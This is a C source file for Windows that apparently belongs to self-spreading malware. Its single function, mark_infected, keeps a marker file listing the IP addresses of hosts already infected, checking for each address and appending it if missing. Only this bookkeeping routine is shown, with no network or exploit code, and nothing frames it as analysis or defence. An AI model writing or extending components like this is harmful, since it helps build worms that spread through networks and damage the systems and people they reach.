#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    size_t ip_len;
    unsigned char buffer[8192];
    size_t position = 0;
    int line_matches = 1;
    int pending_cr = 0;
    int line_has_data = 0;
    DWORD bytes_read;
    LARGE_INTEGER zero;
    LARGE_INTEGER end;

    if (ip == NULL)
        return -1;

    ip_len = strlen(ip);
    if (ip_len == 0 || strchr(ip, '\r') != NULL || strchr(ip, '\n') != NULL)
        return -1;

    file = CreateFileA(SELF_MARKER,
                       GENERIC_READ | GENERIC_WRITE,
                       0,
                       NULL,
                       OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            CloseHandle(file);
            return -1;
        }
        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char c = buffer[i];

            if (c == '\n') {
                if (line_matches && position == ip_len) {
                    CloseHandle(file);
                    return 1;
                }
                position = 0;
                line_matches = 1;
                pending_cr = 0;
                line_has_data = 0;
                continue;
            }

            line_has_data = 1;

            if (pending_cr) {
                if (line_matches) {
                    if (position < ip_len && ip[position] == '\r')
                        ++position;
                    else
                        line_matches = 0;
                }
                pending_cr = 0;
            }

            if (c == '\r') {
                pending_cr = 1;
            } else if (line_matches) {
                if (position < ip_len && (unsigned char)ip[position] == c)
                    ++position;
                else
                    line_matches = 0;
            }
        }
    }

    if (pending_cr && line_matches) {
        if (position < ip_len && ip[position] == '\r')
            ++position;
        else
            line_matches = 0;
    }

    if (line_has_data && line_matches && position == ip_len) {
        CloseHandle(file);
        return 1;
    }

    zero.QuadPart = 0;
    if (!SetFilePointerEx(file, zero, &end, FILE_END)) {
        CloseHandle(file);
        return -1;
    }

    position = 0;
    while (position < ip_len) {
        size_t remaining = ip_len - position;
        DWORD to_write = remaining > (size_t)MAXDWORD
                            ? MAXDWORD
                            : (DWORD)remaining;
        DWORD bytes_written;

        if (!WriteFile(file, ip + position, to_write, &bytes_written, NULL) ||
            bytes_written == 0) {
            CloseHandle(file);
            return -1;
        }
        position += bytes_written;
    }

    {
        const char newline = '\n';
        DWORD bytes_written;

        if (!WriteFile(file, &newline, 1, &bytes_written, NULL) ||
            bytes_written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    CloseHandle(file);
    return 0;
}